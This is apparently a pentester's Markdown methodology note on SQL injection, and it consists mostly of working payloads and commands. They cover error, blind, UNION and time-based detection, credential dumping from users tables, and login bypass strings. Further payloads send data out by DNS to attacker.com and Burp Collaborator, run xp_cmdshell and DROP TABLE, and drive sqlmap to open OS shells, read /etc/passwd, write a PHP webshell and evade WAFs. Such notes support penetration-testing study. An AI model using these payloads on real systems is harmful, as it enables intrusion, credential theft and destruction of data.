---
title: SQL Injection Methodology
date: 2026-07-23
tags:
  - sqli
  - injection
  - methodology
  - sqlmap
  - web
publish: false
draft: false
description: "Comprehensive SQL injection detection and exploitation methodology"
---

# SQL Injection Methodology

## Injection Attack Categories

1. SQL Injection (SQLi)
2. NoSQL Injection
3. Command Injection (OS Injection)
4. Server-Side Template Injection (SSTI)
5. XML External Entity Injection (XXE)
6. LDAP Injection
7. XPath Injection
8. HTML Injection
9. HTTP Header Injection

---

## Section 1: SQL Injection

### 1.1 Understanding the Target First

Before throwing payloads, identify every possible injection point:

- GET parameters → `/search?q=test`
- POST parameters → login forms, search forms
- Cookie values → session cookies parsed by DB
- HTTP Headers → User-Agent, Referer, X-Forwarded-For
- JSON body params → API requests `{"id":"1"}`
- XML body params → SOAP requests
- Path parameters → `/user/1/profile`
- Order by clauses → `?sort=name&order=asc`
- Search fields → any search functionality

### 1.2 Manual Detection First (Always)

Before running sqlmap, always test manually. This tells you:
- What database is running
- What type of SQLi it is
- Whether there's a WAF
- How to tune automated tools

### Step 1: Basic Error Triggering

Inject a single quote and watch the response:

```
# In GET parameter
http://target.com/product?id=1'
http://target.com/product?id=1"
http://target.com/product?id=1`)
http://target.com/product?id=1';--
http://target.com/product?id=1"--
http://target.com/product?id=1'/*

# In search box
search=test'
search=test"
search=test\
```

**Responses to look for:**

| Response | Database |
|----------|----------|
| `You have an error in your SQL syntax` | MySQL |
| `Unclosed quotation mark after the character string` | MSSQL |
| `ORA-01756: quoted string not properly terminated` | Oracle |
| `ERROR: unterminated quoted string at or near` | PostgreSQL |
| `unrecognized token` | SQLite |
| 500 error, blank page, different content length | Generic |

### Step 2: Boolean-Based Detection

Even without errors, you can detect SQLi:

```
# Condition TRUE vs FALSE comparison
http://target.com/product?id=1 AND 1=1    → normal response
http://target.com/product?id=1 AND 1=2    → different/empty response
→ Boolean SQLi confirmed!

# String context
http://target.com/search?q=test' AND '1'='1   → results
http://target.com/search?q=test' AND '1'='2   → no results

# URL encoded version
http://target.com/product?id=1%20AND%201%3D1
```

### Step 3: Time-Based Detection (Blind)

When there's no visible difference in response:

```
# MySQL
http://target.com/product?id=1 AND SLEEP(5)
http://target.com/product?id=1'; SELECT SLEEP(5);--

# MSSQL
http://target.com/product?id=1'; WAITFOR DELAY '0:0:5';--

# PostgreSQL
http://target.com/product?id=1'; SELECT pg_sleep(5);--

# Oracle
http://target.com/product?id=1' AND 1=(SELECT 1 FROM DUAL WHERE 1=1 AND ROWNUM=1 AND (SELECT 1 FROM (SELECT SLEEP(5)) t)=1)--

# Generic
http://target.com/product?id=1 AND SLEEP(5)--
```

If the response takes **5 seconds longer** → Blind Time-based SQLi confirmed.

### Step 4: Identify Number of Columns (for UNION)

```
# ORDER BY method (increment until error)
?id=1 ORDER BY 1--    → OK
?id=1 ORDER BY 2--    → OK
?id=1 ORDER BY 3--    → OK
?id=1 ORDER BY 4--    → ERROR → 3 columns exist

# UNION NULL method
?id=1 UNION SELECT NULL--
?id=1 UNION SELECT NULL,NULL--
?id=1 UNION SELECT NULL,NULL,NULL--   → OK = 3 columns
```

### Step 5: Find Visible Columns

```
?id=0 UNION SELECT 'a',NULL,NULL--
?id=0 UNION SELECT NULL,'a',NULL--
?id=0 UNION SELECT NULL,NULL,'a'--
```

Whichever column shows `'a'` on the page = visible output column.

---

### 1.3 UNION-Based SQL Injection (Full Exploitation)

Once you know the column count and visible column:

```sql
-- Database version
?id=0 UNION SELECT NULL,version(),NULL--           # MySQL/PostgreSQL
?id=0 UNION SELECT NULL,@@version,NULL--           # MySQL/MSSQL
?id=0 UNION SELECT NULL,banner,NULL FROM v$version-- # Oracle

-- Current database name
?id=0 UNION SELECT NULL,database(),NULL--          # MySQL
?id=0 UNION SELECT NULL,current_database(),NULL--  # PostgreSQL

-- Current user
?id=0 UNION SELECT NULL,user(),NULL--              # MySQL
?id=0 UNION SELECT NULL,current_user(),NULL--      # PostgreSQL
?id=0 UNION SELECT NULL,USER,NULL FROM dual--      # Oracle

-- List all databases
?id=0 UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in current DB
?id=0 UNION SELECT NULL,table_name,NULL 
FROM information_schema.tables 
WHERE table_schema=database()--

-- List all columns in a table
?id=0 UNION SELECT NULL,column_name,NULL 
FROM information_schema.columns 
WHERE table_name='users'--

-- Dump data
?id=0 UNION SELECT NULL,concat(username,':',password),NULL FROM users--

-- Concatenate multiple rows
?id=0 UNION SELECT NULL,group_concat(username,':',password SEPARATOR '\n'),NULL FROM users--
```

---

### 1.4 Blind SQL Injection (Boolean-Based Manual)

When there's no output but behavior changes:

```sql
-- Is the first letter of the database name 'a'?
?id=1 AND SUBSTRING(database(),1,1)='a'--   → no change
?id=1 AND SUBSTRING(database(),1,1)='s'--   → change! = 's'

-- What is the full database name? (character by character)
?id=1 AND SUBSTRING(database(),1,1)='s'--
?id=1 AND SUBSTRING(database(),2,1)='h'--
?id=1 AND SUBSTRING(database(),3,1)='o'--

-- Get admin password hash
?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5'--
```

---

### 1.5 Out-of-Band SQL Injection

When blind payloads are too slow, use OOB techniques:

```sql
-- MySQL - DNS exfiltration (requires FILE privilege)
?id=1 AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share'))--

-- MSSQL - DNS via xp_dirtree
?id=1'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- Use Burp Collaborator for DNS callbacks
?id=1 AND LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users LIMIT 1),
  '.burpcollaborator.net\\a'))--
```

---

### 1.6 Error-Based Extraction (MySQL)

Extract data through error messages:

```sql
-- extractvalue technique
?id=1 AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
?id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
?id=1 AND extractvalue(1,concat(0x7e,
  (SELECT concat(username,':',password) FROM users LIMIT 1),0x7e))--

-- updatexml technique
?id=1 AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
```

---

### 1.7 SQL Injection in Different Contexts

#### In Login Forms

```
-- Classic bypass
username: admin'--
username: admin'#
username: ' OR '1'='1
username: ' OR 1=1--
username: admin' OR '1'='1'--
password: anything

-- MSSQL
username: admin'--
username: '; EXEC xp_cmdshell('whoami')--

-- Second order (stored for later use)
username: admin'--   (register with this name)
-- when this username is used in another query later, it fires
```

#### In JSON API Body

```json
{"id": "1 OR 1=1"}
{"id": "1 UNION SELECT username,password FROM users--"}
{"username": "admin'--", "password": "anything"}
{"id": "1; DROP TABLE users--"}
```

#### In HTTP Headers

```
# Inject in User-Agent (if logged to DB)
User-Agent: Mozilla' OR '1'='1

# X-Forwarded-For (if used in queries)
X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--

# Referer
Referer: http://target.com/' OR '1'='1
```

#### In Cookies

```
Cookie: id=1' AND SLEEP(5)--
Cookie: user=admin'--
Cookie: session=1 UNION SELECT username,password FROM users--
```

---

### 1.8 SQLMap (Automated Exploitation)

After confirming injection manually, use sqlmap:

```bash
# Basic GET parameter injection
sqlmap -u "http://target.com/product?id=1" --dbs

# POST injection
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --dbs

# With specific parameter
sqlmap -u "http://target.com/product?id=1&cat=2" \
  -p id \
  --dbs

# With cookies (authenticated session)
sqlmap -u "http://target.com/profile?id=1" \
  --cookie="session=abc123" \
  --dbs

# JSON body injection
sqlmap -u "http://target.com/api/user" \
  --data='{"id":"1"}' \
  --headers="Content-Type: application/json" \
  --dbs

# From Burp request file (preferred method)
sqlmap -r request.txt --dbs

# Level and Risk (higher = more aggressive)
sqlmap -r request.txt --level=5 --risk=3 --dbs

# Skip URL encoding
sqlmap -r request.txt --dbs --tamper=space2comment
```

#### Full Exploitation Chain

```bash
# List databases
sqlmap -r request.txt --dbs

# List tables
sqlmap -r request.txt -D target_db --tables

# List columns
sqlmap -r request.txt -D target_db -T users --columns

# Dump data
sqlmap -r request.txt -D target_db -T users -C username,password --dump

# OS Shell (if high privileges)
sqlmap -r request.txt --os-shell

# SQL Shell
sqlmap -r request.txt --sql-shell

# Read files from server
sqlmap -r request.txt --file-read="/etc/passwd"

# Write webshell
sqlmap -r request.txt \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"
```

---

#### SQLMap Tamper Scripts (WAF Bypass)

```bash
# Space to comment (bypasses space filters)
sqlmap -r request.txt --tamper=space2comment --dbs

# URL encoding
sqlmap -r request.txt --tamper=percentage --dbs

# Multiple tampers combined
sqlmap -r request.txt \
  --tamper=space2comment,between,randomcase \
  --dbs
```

**Common WAF bypass tampers:**

| Tamper | Description |
|--------|-------------|
| `between` | Replaces `>` with `BETWEEN` |
| `charencode` | URL encodes everything |
| `randomcase` | RaNdOm CaSe |
| `space2mysqlblank` | Replaces spaces with MySQL blanks |
| `versionedkeywords` | MySQL version comment wrapping |
| `equaltolike` | Replaces `=` with `LIKE` |

---

### 1.9 Special SQLi: Second-Order Injection

This is often missed and very common in real apps:

1. **Step 1:** Register with username: `admin'--`
2. **Step 2:** App stores it safely in DB
3. **Step 3:** Later, app uses this stored value in another query:
   ```sql
   SELECT * FROM users WHERE username='admin'--'
   ```
4. **Step 4:** The `--` comments out rest of query → injection fires
